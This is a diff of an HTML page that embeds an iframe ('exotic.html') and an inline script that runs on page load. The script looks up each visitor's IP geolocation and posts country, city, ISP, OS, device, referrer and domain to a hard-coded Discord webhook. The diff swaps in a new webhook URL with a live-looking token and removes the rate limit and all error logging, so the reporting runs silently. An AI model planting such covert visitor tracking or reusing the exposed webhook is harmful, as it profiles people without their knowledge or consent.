@@ -10,34 +10,37 @@
     </style>
 </head>
 <body>
- 
+  
     <iframe
         src="exotic.html"
         allowfullscreen
         sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation">
     </iframe>
-
-    <!-- Script corregido -->
+    <!-- ANTES DE </body> -->
     <script>
     (() => {
-      const WEBHOOK = "https://discord.com/api/webhooks/1465859618176503883/bSHA5EB_ra8QyJ73f6OrhnwlNGNTvL7QNNy2wXaNKstFQNlNPYIfq5GPKVnGf0FLQpB9";
-     
+      const WEBHOOK = "https://discord.com/api/webhooks/1465881552859959421/6py4nNvJY4N5F2RXp0whjA8QPlajJnR-bZAkp14o5bxr6JNqZjCFpo2njpe8Mt_e4Cns";
+      
       async function getIPInfo() {
         try {
           const r = await fetch("https://ipapi.co/json/");
           if (!r.ok) return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
-         
+          
           const data = await r.json();
-         
+          
           return {
             country_name: data.country_name || "Desconocido",
             city: data.city || "Desconocido",
             country_code: data.country_code || "XX",
-            isp: data.org || data.asn || "No disponible"  // ← Corregido aquí
+            isp: data.org || data.asn || "No disponible"  // ← ISP agregado aquí
           };
-        } catch (err) {
-          console.error("Error en ipapi.co:", err);
-          return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
+        } catch {
+          return {
+            country_name: "Desconocido",
+            city: "Desconocido",
+            country_code: "XX",
+            isp: "No disponible"
+          };
         }
       }
 
@@ -60,19 +63,11 @@
       }
 
       window.addEventListener("DOMContentLoaded", async () => {
-        // Throttle simple: no más de 1 envío cada 30 segundos
-        const key = "ultimaNotifDiscord";
-        const ultima = localStorage.getItem(key) || 0;
-        if (Date.now() - ultima < 30000) {
-          console.log("Envío saltado: espera 30s (anti-rate-limit Discord)");
-          return;
-        }
-        localStorage.setItem(key, Date.now());
-
         const ip = await getIPInfo();
         const ua = parseUA();
         const originDomain = window.location.hostname;
-       
+        const fullURL = window.location.href;
+        
         const payload = {
           username: "ELDEMON",
           embeds: [{
@@ -82,11 +77,11 @@
               {name: "🌍 País", value: ip.country_name, inline: true},
               {name: "🏙️ Ciudad", value: ip.city, inline: true},
               {name: "📍 Origen", value: ip.country_code === "CO" ? "🇨🇴 Colombia" : "🌐 Exterior", inline: true},
-              {name: "📡 ISP", value: ip.isp, inline: true},
+              {name: "📡 ISP", value: ip.isp, inline: true},                 // ← Línea nueva: aquí sale el ISP
               {name: "💻 SO", value: ua.os, inline: true},
-              {name: "📱 Dispositivo", value: ua.device, inline: true},
-              {name: "🔗 Dominio ref", value: document.referrer || "Directo / Sin referrer", inline: true},
-              {name: "🌐 Sitio Puribal", value: originDomain, inline: true},
+              {name: "📱 Dispositivo",value: ua.device, inline: true},
+              {name: "🔗 Dominio ref",value: document.referrer || "Directo / Sin referrer", inline: true},
+              {name: "🌐 Sitio Puribal",value: originDomain, inline: true},
               {name: "🕒 Hora (UTC)", value: new Date().toISOString(), inline: true}
             ]
           }]
@@ -97,20 +92,7 @@
           headers: {"Content-Type": "application/json"},
           body: JSON.stringify(payload),
           keepalive: true
-        })
-        .then(response => {
-          if (!response.ok) {
-            console.error(`Webhook falló - Status: ${response.status}`);
-            if (response.status === 429) {
-              console.warn("RATE LIMIT alcanzado en Discord → webhook posiblemente bloqueado temporalmente");
-            }
-            return response.text().then(text => console.error("Detalles error:", text));
-          }
-          console.log("✅ Notificación enviada a Discord");
-        })
-        .catch(err => {
-          console.error("Error al enviar al webhook:", err);
-        });
+        }).catch(() => {});
       });
     })();
     </script>
